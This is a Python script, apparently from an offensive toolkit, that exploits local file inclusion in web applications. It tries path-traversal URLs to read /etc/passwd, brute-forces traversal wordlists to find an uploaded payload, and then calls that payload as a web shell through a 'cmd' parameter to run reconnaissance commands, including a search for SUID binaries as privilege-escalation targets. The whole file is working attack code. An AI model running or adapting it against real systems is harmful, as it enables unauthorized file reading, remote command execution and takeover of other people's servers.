#!/usr/bin/env python3

import requests
import urllib.parse

TRAVERSAL_WORDLIST = "wordlists/traversal_small.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt

def show_passwd(target_url, COOKIE):
    print("Attempting to show /etc/passwd...")

    passwd_dir = ["../../../../../../etc/passwd", "/etc/passwd"]

    for passwd in passwd_dir:
        test_url = target_url + passwd
        print(f"[*] Trying LFI URL: {test_url}")
        response = requests.get(test_url, cookies=COOKIE)

        if "root:" in response.text:
            print(response.text)
            return True
        else:
            print("FAILED")
    return False


def brute_force_lfi(
    lfi_url_base,
    payload_filenames,
    success_indicator,
    failure_indicator,
    dir_wordlist,
    session,
    COOKIE,
):

    print(f"Success indicator: {success_indicator}")
    print(f"Failure indicator: {failure_indicator}")

    with open(dir_wordlist, "r") as f:
        payload_relatives = [
            line.strip() for line in f if not line.strip().startswith("#")
        ]

    with open(TRAVERSAL_WORDLIST, "r") as f:
        traversals = f.read().strip().split("\n")

    successful_links = []

    for payload_relative in payload_relatives:
        for traversal in traversals:
            for payload_filename in payload_filenames:
                test_url = (
                    f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                )
                # print(f"[*] Trying LFI URL: {test_url}")

                try:
                    response = session.get(test_url, cookies=COOKIE)

                    is_success = False

                    # Failure indicator check
                    if failure_indicator and failure_indicator in response.text:
                        print(f"[-] Failed to include payload: {test_url}")
                        continue  # Skip this attempt

                    # Success indicator check
                    if success_indicator and success_indicator in response.text:
                        is_success = True

                    # If no success indicator, assume success when failure is absent
                    if (
                        not success_indicator
                        and failure_indicator
                        and failure_indicator not in response.text
                    ):
                        is_success = True

                    if is_success:
                        print(f"[+] Successfully included payload: {test_url}")
                        successful_links.append(test_url)

                except Exception as e:
                    print(f"[-] Error testing {test_url}: {str(e)}")

    return successful_links


def trigger_payload_via_lfi(url, COOKIE):
    """
    Appends the command parameter to the LFI URL to trigger our uploaded payload.
    """
    commands = [
        "whoami",
        "id",
        "uname -a",
        "grep 'x:1000:' /etc/passwd",
        "ls -lAh /home",
        "find /usr/bin /bin -perm -4000 2>/dev/null",
    ]

    for command in commands:
        encoded_cmd = urllib.parse.quote(command)
        separator = "&" if "?" in url else "?"
        full_url = f"{url}{separator}cmd={encoded_cmd}"
        print(f"[*] Triggering payload via LFI at: {full_url}\n")

        try:
            response = requests.get(full_url, cookies=COOKIE)
            if response.status_code == 200:
                # print("[+] Command results:")
                # print(response.text)
                return response.text
            else:
                print(f"[-] Execution failed (HTTP {response.status_code})")
                return None
        except Exception as e:
            print(f"[-] Trigger error: {str(e)}")
            return None
